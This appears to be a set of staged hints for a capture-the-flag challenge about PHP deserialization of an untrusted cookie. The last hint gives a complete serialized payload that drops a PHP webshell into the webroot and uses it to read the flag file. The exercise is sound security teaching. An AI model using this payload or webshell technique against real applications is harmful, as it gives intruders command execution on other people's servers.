# Hints — Estate Sale

<details><summary>Hint 1 — the entry point</summary>

White-box first. Read `src/index.php`. What does it do with the `remember` cookie on every request,
*before* it checks what kind of object it got?
</details>

<details><summary>Hint 2 — the dangerous call</summary>

`unserialize(base64_decode($_COOKIE['remember']))` runs on attacker-controlled input. The
`instanceof RememberToken` check happens *after* unserialize has already built the object. So you can
feed it **any** class the app defines, not just RememberToken.
</details>

<details><summary>Hint 3 — find a gadget</summary>

Look at the other class in `src/classes.php`. Which class has a "magic method" (`__destruct`,
`__wakeup`, `__toString`) that does something dangerous with its properties? Read what `CacheWriter`
does when it is destroyed.
</details>

<details><summary>Hint 4 — weaponise it</summary>

`CacheWriter::__destruct()` does `file_put_contents($this->file, $this->data)`. You control both. Craft
a serialized `CacheWriter` whose `file` is a path in the webroot (`/var/www/html/…php`) and whose `data`
is a PHP webshell. Base64 it, set it as the `remember` cookie, make a request.
</details>

<details><summary>Hint 5 — the payload shape</summary>

```
O:11:"CacheWriter":2:{s:4:"file";s:23:"/var/www/html/sh3ll.php";s:4:"data";s:28:"<?php system($_GET['c']); ?>";}
```
Count the string lengths exactly, or build it in code. Base64-encode the whole thing. Then browse to
your dropped shell: `/sh3ll.php?c=cat /flag.txt`.
</details>
